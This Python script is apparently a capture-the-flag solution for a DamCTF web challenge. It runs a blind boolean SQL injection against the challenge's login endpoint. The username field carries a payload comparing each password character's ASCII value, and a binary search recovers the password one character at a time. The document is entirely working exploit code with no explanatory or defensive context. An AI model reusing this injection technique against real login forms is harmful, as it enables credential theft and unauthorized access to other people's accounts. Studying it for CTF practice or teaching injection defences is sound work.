import requests
host="https://bouncy-box.chals.damctf.xyz/login"

def sqli(pos,mid):
    data = {
        "username":"boxy_mcbounce' AND ascii(substr(password,%i,1))>%i -- -" % (pos,mid),
        "password":"a",
        "score":0
    }
    r = requests.post(host, json=data)
    print(data, r.text)
    return "Logging you" in r.text

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag = ''
for i in range(1, 15):
    flag += get_char(i)
    print(flag)